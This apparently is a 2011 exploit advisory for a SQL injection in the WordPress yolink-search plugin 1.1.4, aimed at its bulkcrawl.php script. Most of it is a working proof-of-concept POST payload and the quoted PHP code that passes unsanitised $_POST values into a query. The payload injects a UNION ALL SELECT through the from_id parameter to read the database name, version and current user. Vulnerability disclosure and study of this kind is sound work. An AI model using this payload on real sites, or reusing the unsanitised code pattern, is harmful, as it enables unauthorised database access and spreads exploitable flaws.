# Date: 2011-08-30
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.1.4 (tested)
 
---------------
PoC (POST data)
---------------
http://www.site.com/wp-content/plugins/yolink-search/includes/bulkcrawl.php
 page=-1&from_id=-1 UNION ALL SELECT CONCAT_WS(CHAR(58),database(),version(),current_user()),NULL--%20&batch_size=-1
 
---------------
Vulnerable code
---------------
$post_type_in = array();
 
if( isset( $_POST[&#039;page&#039;] ) )
{
    $post_type_in[] = &#039;"page"&#039;;
}
if( isset( $_POST[&#039;post&#039;] ) )
{
    $post_type_in[] = &#039;"post"&#039;;
}
$post_type_in = &#039;(&#039; . implode(&#039;,&#039;, $post_type_in) . &#039;)&#039;;
$id_from = $_POST[&#039;from_id&#039;];
$batch_size = $_POST[&#039;batch_size&#039;];
 



